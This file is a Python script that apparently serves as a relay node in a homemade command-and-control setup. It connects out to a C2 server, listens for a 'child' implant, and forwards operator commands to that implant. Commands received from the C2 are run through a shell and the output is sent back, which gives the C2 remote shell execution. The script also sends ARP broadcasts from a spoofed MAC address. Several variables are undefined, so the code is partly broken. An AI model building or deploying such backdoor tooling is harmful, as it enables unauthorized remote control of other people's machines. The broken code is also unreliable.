#! /usr/bin/python

import time
from scapy.all import *
import socket
import sys

def custom_action(packet):
 global counter
 counter += 1
 return 'Packet #{}: {} ==> {}'.format(counter, packet[0][1].src, packet[0][1].dst)


C2_server_name = '192.168.0.16'
C2_server_address = (C2_server_name, 8888)

parent_name = '192.168.0.16'
parent_address = (parent_name, 9999)



#C2 setup before sending network traffic out
# Create a TCP/IP socket for  & C2
C2_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#===C2 information=========

#connecting to C2 server
# Create a TCP/IP socket
try:
 C2_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print('C2 socket created')
except:
 print('unable to create C2 socket')
 exit()

 print('connecting to {} port {} for C@'.format(*C2_server_address))
 
try:
  C2_sock.connect(C2_server_address) 
  print('connection to C2 successful')
except:
   print('connection to C2 unsuccssful')
 
#========Parent (self) information=============
#create socket and listen for child to connect
try:
 parent_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except:
 print('not able to create socket')
 exit()

# Bind the socket to the address given on the command line

print('starting up on {} port {}'.format(*parent_address))
try:
 parent_sock.bind(parent_address)
except:
 print('unable to bind to port for child')
 exit()
print('listening for connection from Child')
parent_sock.listen(1)
# Connect the socket to the port on the server
# given by the caller
#parent_sock = (chief, 9999)
#print('connecting to {} port {}'.format(*parent_sock_address))
#parent_sock.connect(server_address)




#===sending out network traffic for Child C2=====
print(" Running Arp Ping")
#arpPingIPList = ["127.0.0.1"]
#arping(IPRange)
#ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IPRange), timeout=5)

a = IP(ttl=10)
print(a.show)
print("Source:", a.src)
print("TTL:", a.ttl)
#ans,unans = srp(IP(src="192.168.0.11",dst="192.168.0.15")/ICMP()/"Hello World")
for x in range( 0, 2):
 ans,unans=srp(Ether(src="AA:AA:AA:AA:BB:BB",dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.0.5"),timeout=2)

#for snd,rcv in ans:
# print (rcv.sprintf(r"%Ether.src% & %ARP.psrc%\\"))
# print("finished")
 
#print("Sniffing")( 
#sniff(lfilter=lambda d: d.src == "AA:AA:AA:AA:BB:BB:BB:BB", prn=custom_action)



#=== Loop for receiving communication from C2 and Child



while True:
 print('waiting for a connection from child')
 #accepting connection from child
 childconnection, client_address = parent_sock.accept()
 try:
  print('client connected:', client_address)
  data = childconnection.recv(1024)
  print('received {!r}'.format(data))
  while True:
   #command to send to child
   DataSend = input("Enter Command to send> ")
   if DataSend:
    DataSend2 = str(DataSend)
    print(DataSend2)
    childconnection.sendall(DataSend.encode())
   else:
    break
   
   
   
   #receiving from child
   data = childconnection.recv(1024)
   if data:
    print(data.decode())
   else:
    break            
 
   if command:
    #cmdResult = subprocess.run(command, shell=True, check=True)
    cmdResult = subprocess.check_output(command, shell=True) # result is in bytes
    print(cmdResult)
    sock.sendall(cmdResult)
   else:
    break 
   
   #=====receiving command from C2 Server====
  
   C2data = C2_sock.recv(1024)
   print('received {!r}'.format(C2data.decode()))
   C2command = C2data.decode()     
         
 
   if C2command:
    #cmdResult = subprocess.run(command, shell=True, check=True)
    C2cmdResult = subprocess.check_output(C2command, shell=True) # result is in bytes
    print(C2cmdResult)
    sock.sendall(C2cmdResult)
   else:
    break   
 
 finally:
  childconnection.close()
  c2_sock.close()